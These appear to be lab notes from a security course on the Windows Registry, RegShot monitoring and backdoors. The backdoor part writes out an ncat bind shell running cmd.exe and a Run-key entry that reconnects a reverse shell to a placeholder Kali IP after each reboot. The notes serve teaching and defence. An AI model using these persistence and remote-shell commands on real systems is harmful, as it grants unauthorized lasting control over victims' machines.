# WINDOWS REGISTRY & BACKDOORS
21-10-24

---

## Content Overview
1. Introduction to the Windows Registry.
2. Registry Structure and Modification.
3. Registry Monitoring.
4. Introduction to Backdoors.
5. Backdoor Setup and Persistent Backdoors.

---

## Windows Registry
- **Definition**:
  - A hierarchical database storing information, settings, and preferences for hardware, software, and users on a Windows system.
- **Key Features**:
  - Stores operating system configurations, hardware setups, and user preferences.
  - Continually referenced by Windows during operation.
- **Examples of Values Stored**:
  - Computer Name, Last Logged-In User, Startup Applications, USB Devices, Recently Accessed Files.

---

## Registry Structure
- **Components**:
  - Hives, Root Keys, Keys, Sub-keys, and Values.
- **Root Keys**:
  1. **HKEY_CLASSES_ROOT**:
     - Application and filetype associations.
  2. **HKEY_CURRENT_USER**:
     - Active user profile settings.
  3. **HKEY_LOCAL_MACHINE**:
     - System-specific hardware/software configurations.
  4. **HKEY_USERS**:
     - Settings for all user profiles.
  5. **HKEY_CURRENT_CONFIG**:
     - Current hardware configurations.

---

## Registry Modification
1. **Example**:
   - Modify the `Run` key at `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` to auto-start applications like `notepad.exe`.
2. **Steps**:
   - Navigate to the key → Right Click → New → String Value.
   - Name the value and enter `notepad.exe` in the Value Data field.
   - Restart the system to see changes.
3. **Security Implications**:
   - Registry modifications can be exploited for malicious purposes, such as setting up persistent malware.

---

## Registry Monitoring
1. **Purpose**:
   - Detect changes indicating software installation, configuration updates, or potential malicious activity.
2. **Tool**: **RegShot**:
   - Captures snapshots of the registry at two points in time for comparison.
   - Highlights added, modified, or deleted keys and values.
3. **Process**:
   - Take an initial snapshot → Perform changes (e.g., software installation) → Take a second snapshot → Compare results.

---

## Backdoors
- **Definition**:
  - A method to bypass normal security measures and gain unauthorized access to a system.
- **Examples**:
  - Administrative tools, malicious exploits, or government mechanisms for accessing encrypted data.
- **Risks**:
  - Backdoors can be exploited by attackers for unauthorized access or malicious activity.

---

## Backdoor Setup
1. **Environment Setup**:
   - Requires a Windows 7 VM and Kali VM with Host-Only networking configured.
   - Install **nmap** software on Windows 7 to use the `ncat` component.

2. **Steps**:
   - On Windows 7:
     - Run `ncat -l -p 1234 -e cmd.exe -v` in CMD to establish a backdoor.
   - On Kali:
     - Use `nc <Windows_IP> 1234` to connect and execute commands remotely.

3. **Verification**:
   - Test connectivity between VMs using `ping` commands.

---

## Persistent Backdoor Setup
1. **Registry Modification**:
   - Add a new registry key at `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.
   - Set the value to:  
     `C:\Program Files\Nmap\ncat.exe <Kali_IP> 2354 -e cmd.exe`.
2. **Steps**:
   - Modify registry on Windows 7 → Reboot system → Establish a netcat session from Kali using `nc -l -p 2354 -v`.

3. **Result**:
   - A persistent backdoor allows remote CMD access after system reboot.

---

## Key Takeaways
1. **Windows Registry**:
   - Central to system and application configurations but vulnerable to misuse.
2. **Monitoring Tools**:
   - Tools like RegShot help detect registry changes for forensic or troubleshooting purposes.
3. **Backdoors**:
   - Highlight security risks and the importance of monitoring unauthorized access attempts.
